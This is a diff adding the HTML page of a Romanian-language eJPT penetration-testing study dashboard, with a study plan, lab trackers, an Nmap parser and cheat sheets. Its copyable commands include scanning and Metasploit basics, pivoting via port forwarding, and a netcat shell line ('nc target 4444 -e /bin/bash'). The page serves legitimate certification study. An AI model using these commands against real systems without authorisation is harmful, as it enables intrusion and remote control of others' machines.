@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eJPT Dashboard - Platformă Completă de Pregătire și Examen</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-left">
+                <div class="logo">
+                    <h1>eJPT Dashboard</h1>
+                </div>
+            </div>
+            <div class="header-center">
+                <div class="exam-timer">
+                    <span class="timer-label">Timer Examen:</span>
+                    <span class="timer-display" id="examTimer">48:00:00</span>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="globalProgress"></div>
+                    </div>
+                    <span class="progress-text" id="progressText">0% Completat</span>
+                </div>
+            </div>
+            <div class="header-right">
+                <button class="btn btn--secondary" id="themeToggle">🌙</button>
+                <button class="btn btn--primary" id="exportBtn">Export</button>
+            </div>
+        </header>
+
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <nav class="nav-menu">
+                <a href="#exam-info" class="nav-item active" data-section="exam-info">
+                    <span class="nav-icon">📋</span>
+                    <span class="nav-text">Exam Info</span>
+                </a>
+                <a href="#study-plan" class="nav-item" data-section="study-plan">
+                    <span class="nav-icon">📚</span>
+                    <span class="nav-text">Study Plan</span>
+                </a>
+                <a href="#learning-resources" class="nav-item" data-section="learning-resources">
+                    <span class="nav-icon">🎓</span>
+                    <span class="nav-text">Resources</span>
+                </a>
+                <a href="#practice-platforms" class="nav-item" data-section="practice-platforms">
+                    <span class="nav-icon">💻</span>
+                    <span class="nav-text">Practice</span>
+                </a>
+                <a href="#tools-techniques" class="nav-item" data-section="tools-techniques">
+                    <span class="nav-icon">🔧</span>
+                    <span class="nav-text">Tools</span>
+                </a>
+                <a href="#nmap-parser" class="nav-item" data-section="nmap-parser">
+                    <span class="nav-icon">🔍</span>
+                    <span class="nav-text">Nmap Parser</span>
+                </a>
+                <a href="#command-generator" class="nav-item" data-section="command-generator">
+                    <span class="nav-icon">⚡</span>
+                    <span class="nav-text">Commands</span>
+                </a>
+                <a href="#pivot-assistant" class="nav-item" data-section="pivot-assistant">
+                    <span class="nav-icon">🔄</span>
+                    <span class="nav-text">Pivot</span>
+                </a>
+                <a href="#vulnerability-tracker" class="nav-item" data-section="vulnerability-tracker">
+                    <span class="nav-icon">🛡️</span>
+                    <span class="nav-text">Vulns</span>
+                </a>
+                <a href="#notes-methodology" class="nav-item" data-section="notes-methodology">
+                    <span class="nav-icon">📝</span>
+                    <span class="nav-text">Notes</span>
+                </a>
+                <a href="#exam-mode" class="nav-item" data-section="exam-mode">
+                    <span class="nav-icon">🎯</span>
+                    <span class="nav-text">Exam Mode</span>
+                </a>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Exam Info Section -->
+            <section id="exam-info" class="content-section active">
+                <div class="section-header">
+                    <h2>Informații Examen eJPT</h2>
+                    <p>Detalii complete despre structura și cerințele examenului</p>
+                </div>
+                
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Detalii Generale</h3>
+                            <div class="exam-details">
+                                <div class="detail-item">
+                                    <strong>Durată:</strong> 48 ore
+                                </div>
+                                <div class="detail-item">
+                                    <strong>Scor Minim:</strong> 70% (15/20 întrebări)
+                                </div>
+                                <div class="detail-item">
+                                    <strong>Preț:</strong> $249 (include 3 luni INE)
+                                </div>
+                                <div class="detail-item">
+                                    <strong>Format:</strong> Practic cu întrebări multiple choice
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Domenii de Cunoștințe</h3>
+                            <div class="knowledge-domains">
+                                <div class="domain-item">
+                                    <div class="domain-label">Assessment Methodologies</div>
+                                    <div class="domain-bar">
+                                        <div class="domain-fill" style="width: 25%"></div>
+                                    </div>
+                                    <div class="domain-percent">25%</div>
+                                </div>
+                                <div class="domain-item">
+                                    <div class="domain-label">Host & Network Auditing</div>
+                                    <div class="domain-bar">
+                                        <div class="domain-fill" style="width: 25%"></div>
+                                    </div>
+                                    <div class="domain-percent">25%</div>
+                                </div>
+                                <div class="domain-item">
+                                    <div class="domain-label">Host & Network Pentesting</div>
+                                    <div class="domain-bar">
+                                        <div class="domain-fill" style="width: 35%"></div>
+                                    </div>
+                                    <div class="domain-percent">35%</div>
+                                </div>
+                                <div class="domain-item">
+                                    <div class="domain-label">Web Application Pentesting</div>
+                                    <div class="domain-bar">
+                                        <div class="domain-fill" style="width: 15%"></div>
+                                    </div>
+                                    <div class="domain-percent">15%</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Tips pentru Succes</h3>
+                            <ul class="tips-list">
+                                <li>Practică cu TryHackMe și HackTheBox înainte</li>
+                                <li>Stăpânește Nmap și Metasploit</li>
+                                <li>Învață să folosești Burp Suite eficient</li>
+                                <li>Exersează pivoting-ul în rețele</li>
+                                <li>Ține note detaliate în timpul examenului</li>
+                                <li>Gestionează timpul eficient (48h par mult, dar trec repede)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Study Plan Section -->
+            <section id="study-plan" class="content-section">
+                <div class="section-header">
+                    <h2>Plan de Studiu</h2>
+                    <p>Plan structurat pe 2 luni pentru pregătirea optimă</p>
+                </div>
+
+                <div class="study-phases">
+                    <div class="phase-card">
+                        <div class="phase-header">
+                            <h3>Faza 1: Fundamentele</h3>
+                            <span class="phase-weeks">Săptămânile 1-2</span>
+                        </div>
+                        <div class="phase-content">
+                            <p><strong>Focus:</strong> Networking de bază, Linux, Nmap</p>
+                            <div class="resources-list">
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-1" class="resource-checkbox">
+                                    <label for="resource-1">INE PTS Course</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-2" class="resource-checkbox">
+                                    <label for="resource-2">TryHackMe Linux rooms</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-3" class="resource-checkbox">
+                                    <label for="resource-3">Documentația Nmap</label>
+                                </div>
+                            </div>
+                            <div class="phase-progress">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" data-phase="1"></div>
+                                </div>
+                                <span class="progress-label">0% completat</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="phase-card">
+                        <div class="phase-header">
+                            <h3>Faza 2: Enumerarea</h3>
+                            <span class="phase-weeks">Săptămânile 3-4</span>
+                        </div>
+                        <div class="phase-content">
+                            <p><strong>Focus:</strong> Enumerarea serviciilor, evaluarea vulnerabilităților</p>
+                            <div class="resources-list">
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-4" class="resource-checkbox">
+                                    <label for="resource-4">Enum4linux</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-5" class="resource-checkbox">
+                                    <label for="resource-5">Gobuster</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-6" class="resource-checkbox">
+                                    <label for="resource-6">TryHackMe enumeration rooms</label>
+                                </div>
+                            </div>
+                            <div class="phase-progress">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" data-phase="2"></div>
+                                </div>
+                                <span class="progress-label">0% completat</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="phase-card">
+                        <div class="phase-header">
+                            <h3>Faza 3: Exploatarea</h3>
+                            <span class="phase-weeks">Săptămânile 5-6</span>
+                        </div>
+                        <div class="phase-content">
+                            <p><strong>Focus:</strong> Metasploit, atacuri web, escalarea privilegiilor</p>
+                            <div class="resources-list">
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-7" class="resource-checkbox">
+                                    <label for="resource-7">Documentația Metasploit</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-8" class="resource-checkbox">
+                                    <label for="resource-8">OWASP Top 10</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-9" class="resource-checkbox">
+                                    <label for="resource-9">HackTheBox Starting Point</label>
+                                </div>
+                            </div>
+                            <div class="phase-progress">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" data-phase="3"></div>
+                                </div>
+                                <span class="progress-label">0% completat</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="phase-card">
+                        <div class="phase-header">
+                            <h3>Faza 4: Practică</h3>
+                            <span class="phase-weeks">Săptămânile 7-8</span>
+                        </div>
+                        <div class="phase-content">
+                            <p><strong>Focus:</strong> Teste complete de penetrare, pivoting, raportare</p>
+                            <div class="resources-list">
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-10" class="resource-checkbox">
+                                    <label for="resource-10">Mașini VulnHub</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-11" class="resource-checkbox">
+                                    <label for="resource-11">INE Black Box labs</label>
+                                </div>
+                                <div class="resource-item">
+                                    <input type="checkbox" id="resource-12" class="resource-checkbox">
+                                    <label for="resource-12">Scrierea rapoartelor</label>
+                                </div>
+                            </div>
+                            <div class="phase-progress">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" data-phase="4"></div>
+                                </div>
+                                <span class="progress-label">0% completat</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Learning Resources Section -->
+            <section id="learning-resources" class="content-section">
+                <div class="section-header">
+                    <h2>Resurse de Învățare</h2>
+                    <p>Cursuri, cărți și materiale recomandate</p>
+                </div>
+
+                <div class="resources-container">
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Cursuri Oficiale</h3>
+                            <div class="course-item">
+                                <h4>INE Security - Penetration Testing Student (PTS)</h4>
+                                <div class="course-details">
+                                    <span class="badge">145+ ore</span>
+                                    <span class="badge">121 lab-uri</span>
+                                    <span class="badge">56 ore video</span>
+                                </div>
+                                <p>Inclus în abonamentul INE - Cea mai bună pregătire pentru eJPT</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Cărți Recomandate</h3>
+                            <div class="books-list">
+                                <div class="book-item">
+                                    <h4>Georgia Weidman's Penetration Testing</h4>
+                                    <p>Ghid complet pentru începători în penetration testing</p>
+                                    <span class="book-focus">Focus: Fundamentele</span>
+                                </div>
+                                <div class="book-item">
+                                    <h4>The Web Application Hacker's Handbook</h4>
+                                    <p>Manual de referință pentru securitatea aplicațiilor web</p>
+                                    <span class="book-focus">Focus: Aplicații Web</span>
+                                </div>
+                                <div class="book-item">
+                                    <h4>Nmap Network Scanning</h4>
+                                    <p>Ghidul oficial pentru utilizarea Nmap</p>
+                                    <span class="book-focus">Focus: Network Scanning</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Practice Platforms Section -->
+            <section id="practice-platforms" class="content-section">
+                <div class="section-header">
+                    <h2>Platforme de Practică</h2>
+                    <p>Laboratoare și challenge-uri pentru exersare</p>
+                </div>
+
+                <div class="platforms-tabs">
+                    <button class="tab-btn active" data-platform="tryhackme">TryHackMe</button>
+                    <button class="tab-btn" data-platform="hackthebox">HackTheBox</button>
+                    <button class="tab-btn" data-platform="vulnhub">VulnHub</button>
+                </div>
+
+                <div class="platform-content">
+                    <div id="tryhackme" class="platform-tab active">
+                        <div class="rooms-grid">
+                            <div class="room-card" data-category="Linux">
+                                <h4>picklerick</h4>
+                                <div class="room-meta">
+                                    <span class="difficulty easy">Easy</span>
+                                    <span class="category">Linux</span>
+                                </div>
+                                <div class="room-status">
+                                    <input type="checkbox" class="room-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="room-card" data-category="Linux">
+                                <h4>basicpentestingjt</h4>
+                                <div class="room-meta">
+                                    <span class="difficulty easy">Easy</span>
+                                    <span class="category">Linux</span>
+                                </div>
+                                <div class="room-status">
+                                    <input type="checkbox" class="room-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="room-card" data-category="WordPress">
+                                <h4>blog</h4>
+                                <div class="room-meta">
+                                    <span class="difficulty medium">Medium</span>
+                                    <span class="category">WordPress</span>
+                                </div>
+                                <div class="room-status">
+                                    <input type="checkbox" class="room-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="room-card" data-category="Windows">
+                                <h4>blue</h4>
+                                <div class="room-meta">
+                                    <span class="difficulty easy">Easy</span>
+                                    <span class="category">Windows</span>
+                                </div>
+                                <div class="room-status">
+                                    <input type="checkbox" class="room-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="hackthebox" class="platform-tab">
+                        <div class="modules-list">
+                            <div class="module-item">
+                                <h4>Introduction to Networking</h4>
+                                <span class="module-category">Fundamentals</span>
+                                <div class="module-progress">
+                                    <input type="checkbox" class="module-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="module-item">
+                                <h4>Linux Fundamentals</h4>
+                                <span class="module-category">Operating Systems</span>
+                                <div class="module-progress">
+                                    <input type="checkbox" class="module-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="module-item">
+                                <h4>Using the Metasploit Framework</h4>
+                                <span class="module-category">Exploitation</span>
+                                <div class="module-progress">
+                                    <input type="checkbox" class="module-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="vulnhub" class="platform-tab">
+                        <div class="machines-list">
+                            <div class="machine-item">
+                                <h4>DC-1</h4>
+                                <div class="machine-meta">
+                                    <span class="difficulty beginner">Beginner</span>
+                                    <span class="focus">Focus: Drupal</span>
+                                </div>
+                                <div class="machine-status">
+                                    <input type="checkbox" class="machine-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                            <div class="machine-item">
+                                <h4>Kioptrix: Level 1</h4>
+                                <div class="machine-meta">
+                                    <span class="difficulty beginner">Beginner</span>
+                                    <span class="focus">Focus: Multi-vector</span>
+                                </div>
+                                <div class="machine-status">
+                                    <input type="checkbox" class="machine-completed">
+                                    <label>Completat</label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tools & Techniques Section -->
+            <section id="tools-techniques" class="content-section">
+                <div class="section-header">
+                    <h2>Instrumente și Tehnici</h2>
+                    <p>Cheat sheets interactive pentru instrumente esențiale</p>
+                </div>
+
+                <div class="tools-categories">
+                    <button class="category-btn active" data-category="scanning">Scanning</button>
+                    <button class="category-btn" data-category="exploitation">Exploitation</button>
+                    <button class="category-btn" data-category="post-exploitation">Post-Exploitation</button>
+                </div>
+
+                <div class="tools-content">
+                    <div id="scanning" class="tools-category active">
+                        <div class="tool-card">
+                            <h3>Nmap</h3>
+                            <p>Network discovery și security auditing</p>
+                            <div class="commands-list">
+                                <div class="command-item">
+                                    <code>nmap -sS -sV -O target</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('nmap -sS -sV -O target')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>nmap -sC -sV target</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('nmap -sC -sV target')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>nmap -p- target</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('nmap -p- target')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tool-card">
+                            <h3>Gobuster</h3>
+                            <p>Directory/file brute-forcer</p>
+                            <div class="commands-list">
+                                <div class="command-item">
+                                    <code>gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="exploitation" class="tools-category">
+                        <div class="tool-card">
+                            <h3>Metasploit</h3>
+                            <p>Penetration testing framework</p>
+                            <div class="commands-list">
+                                <div class="command-item">
+                                    <code>msfconsole</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('msfconsole')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>search exploit</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('search exploit')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>use exploit/path</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('use exploit/path')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="post-exploitation" class="tools-category">
+                        <div class="tool-card">
+                            <h3>Netcat</h3>
+                            <p>Network utility pentru conexiuni de rețea</p>
+                            <div class="commands-list">
+                                <div class="command-item">
+                                    <code>nc -nlvp 4444</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('nc -nlvp 4444')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>nc target 4444 -e /bin/bash</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('nc target 4444 -e /bin/bash')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Nmap Parser Section -->
+            <section id="nmap-parser" class="content-section">
+                <div class="section-header">
+                    <h2>Nmap Parser</h2>
+                    <p>Import și analizează rezultatele Nmap</p>
+                </div>
+
+                <div class="parser-container">
+                    <div class="upload-area" id="nmapUpload">
+                        <div class="upload-content">
+                            <div class="upload-icon">📄</div>
+                            <h3>Drag & Drop fișier XML Nmap</h3>
+                            <p>sau click pentru a selecta</p>
+                            <input type="file" id="nmapFile" accept=".xml" style="display: none;">
+                        </div>
+                    </div>
+
+                    <div class="parsed-results" id="parsedResults" style="display: none;">
+                        <h3>Rezultate Parsate</h3>
+                        <div class="results-table">
+                            <table id="hostsTable">
+                                <thead>
+                                    <tr>
+                                        <th>IP</th>
+                                        <th>Hostname</th>
+                                        <th>Status</th>
+                                        <th>Porturi Deschise</th>
+                                        <th>OS</th>
+                                        <th>Acțiuni</th>
+                                    </tr>
+                                </thead>
+                                <tbody></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Command Generator Section -->
+            <section id="command-generator" class="content-section">
+                <div class="section-header">
+                    <h2>Generator de Comenzi</h2>
+                    <p>Generează comenzi contextuale bazate pe serviciile detectate</p>
+                </div>
+
+                <div class="generator-container">
+                    <div class="input-section">
+                        <div class="form-group">
+                            <label class="form-label">IP Target</label>
+                            <input type="text" class="form-control" id="targetIP" placeholder="192.168.1.100">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Port</label>
+                            <input type="text" class="form-control" id="targetPort" placeholder="80">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Serviciu</label>
+                            <select class="form-control" id="serviceSelect">
+                                <option value="">Selectează serviciul</option>
+                                <option value="http">HTTP</option>
+                                <option value="https">HTTPS</option>
+                                <option value="ssh">SSH</option>
+                                <option value="ftp">FTP</option>
+                                <option value="smb">SMB</option>
+                                <option value="mysql">MySQL</option>
+                                <option value="rdp">RDP</option>
+                            </select>
+                        </div>
+
+                        <button class="btn btn--primary" id="generateCommands">Generează Comenzi</button>
+                    </div>
+
+                    <div class="commands-output" id="commandsOutput">
+                        <h3>Comenzi Generate</h3>
+                        <div class="commands-container" id="generatedCommands"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Pivot Assistant Section -->
+            <section id="pivot-assistant" class="content-section">
+                <div class="section-header">
+                    <h2>Asistent Pivot</h2>
+                    <p>Configurează lateral movement și pivoting</p>
+                </div>
+
+                <div class="pivot-tools">
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Network Discovery</h3>
+                            <div class="tool-commands">
+                                <div class="command-item">
+                                    <code>arp -a</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('arp -a')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>netstat -rn</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('netstat -rn')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Port Forwarding</h3>
+                            <div class="tool-commands">
+                                <div class="command-item">
+                                    <code>ssh -L 8080:target:80 user@pivot</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('ssh -L 8080:target:80 user@pivot')">📋</button>
+                                </div>
+                                <div class="command-item">
+                                    <code>meterpreter> portfwd add -l 8080 -p 80 -r target</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('meterpreter> portfwd add -l 8080 -p 80 -r target')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card__body">
+                            <h3>Proxychains Setup</h3>
+                            <div class="tool-commands">
+                                <div class="command-item">
+                                    <code>proxychains nmap -sT target</code>
+                                    <button class="copy-btn" onclick="copyToClipboard('proxychains nmap -sT target')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Vulnerability Tracker Section -->
+            <section id="vulnerability-tracker" class="content-section">
+                <div class="section-header">
+                    <h2>Tracker Vulnerabilități</h2>
+                    <p>Monitorizează și evaluează vulnerabilitățile detectate</p>
+                </div>
+
+                <div class="vuln-tracker">
+                    <div class="add-vuln-form">
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="vulnHost" placeholder="Host/IP">
+                        </div>
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="vulnService" placeholder="Serviciu">
+                        </div>
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="vulnCVE" placeholder="CVE (opțional)">
+                        </div>
+                        <div class="form-group">
+                            <select class="form-control" id="vulnSeverity">
+                                <option value="critical">Critical</option>
+                                <option value="high">High</option>
+                                <option value="medium">Medium</option>
+                                <option value="low">Low</option>
+                            </select>
+                        </div>
+                        <button class="btn btn--primary" id="addVulnBtn">Adaugă Vulnerabilitate</button>
+                    </div>
+
+                    <div class="vulnerabilities-list" id="vulnerabilitiesList">
+                        <h3>Vulnerabilități Detectate</h3>
+                        <div class="vulns-container"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Notes & Methodology Section -->
+            <section id="notes-methodology" class="content-section">
+                <div class="section-header">
+                    <h2>Note și Metodologie</h2>
+                    <p>Organizează notele după fazele PTES</p>
+                </div>
+
+                <div class="methodology-container">
+                    <div class="methodology-phases">
+                        <button class="phase-btn active" data-phase="information-gathering">Information Gathering</button>
+                        <button class="phase-btn" data-phase="network-discovery">Network Discovery</button>
+                        <button class="phase-btn" data-phase="service-enumeration">Service Enumeration</button>
+                        <button class="phase-btn" data-phase="vulnerability-assessment">Vulnerability Assessment</button>
+                        <button class="phase-btn" data-phase="exploitation">Exploitation</button>
+                        <button class="phase-btn" data-phase="post-exploitation">Post-Exploitation</button>
+                        <button class="phase-btn" data-phase="lateral-movement">Lateral Movement</button>
+                    </div>
+
+                    <div class="notes-editor">
+                        <div class="editor-header">
+                            <h3 id="currentPhaseTitle">Information Gathering</h3>
+                            <div class="editor-controls">
+                                <button class="btn btn--secondary" id="saveNotesBtn">Salvează</button>
+                                <button class="btn btn--secondary" id="clearNotesBtn">Șterge</button>
+                            </div>
+                        </div>
+                        <textarea id="notesEditor" class="notes-textarea" placeholder="Introdu notele pentru această fază..."></textarea>
+                    </div>
+
+                    <div class="methodology-checklist">
+                        <h3>Checklist Metodologie</h3>
+                        <div id="checklistContainer"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Exam Mode Section -->
+            <section id="exam-mode" class="content-section">
+                <div class="section-header">
+                    <h2>Mod Examen</h2>
+                    <p>Interfață simplificată pentru timpul examenului</p>
+                </div>
+
+                <div class="exam-mode-container">
+                    <div class="exam-controls">
+                        <button class="btn btn--primary btn--lg" id="startExamBtn">Începe Examenul</button>
+                        <button class="btn btn--secondary" id="pauseExamBtn" style="display: none;">Pauză</button>
+                        <button class="btn btn--outline" id="resetExamBtn">Reset Timer</button>
+                    </div>
+
+                    <div class="quick-access-tools">
+                        <h3>Acces Rapid</h3>
+                        <div class="quick-tools-grid">
+                            <button class="quick-tool-btn" data-section="nmap-parser">
+                                <span class="tool-icon">🔍</span>
+                                <span class="tool-name">Nmap Parser</span>
+                            </button>
+                            <button class="quick-tool-btn" data-section="command-generator">
+                                <span class="tool-icon">⚡</span>
+                                <span class="tool-name">Commands</span>
+                            </button>
+                            <button class="quick-tool-btn" data-section="pivot-assistant">
+                                <span class="tool-icon">🔄</span>
+                                <span class="tool-name">Pivot</span>
+                            </button>
+                            <button class="quick-tool-btn" data-section="vulnerability-tracker">
+                                <span class="tool-icon">🛡️</span>
+                                <span class="tool-name">Vulns</span>
+                            </button>
+                            <button class="quick-tool-btn" data-section="notes-methodology">
+                                <span class="tool-icon">📝</span>
+                                <span class="tool-name">Notes</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="exam-summary">
+                        <h3>Rezumat Progres</h3>
+                        <div class="summary-stats">
+                            <div class="stat-item">
+                                <span class="stat-value" id="hostsScanned">0</div>
+                                <span class="stat-label">Hosts Scanate</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-value" id="vulnsFound">0</span>
+                                <span class="stat-label">Vulnerabilități</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-value" id="notesCount">0</span>
+                                <span class="stat-label">Note Salvate</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <span>eJPT Dashboard v1.0</span>
+                </div>
+                <div class="footer-right">
+                    <span>Ultima salvare: <span id="lastSaved">Niciodată</span></span>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Toast notifications -->
+    <div id="toastContainer" class="toast-container"></div>
+
+    <script src="app.js"></script>
+</body>
+</html>
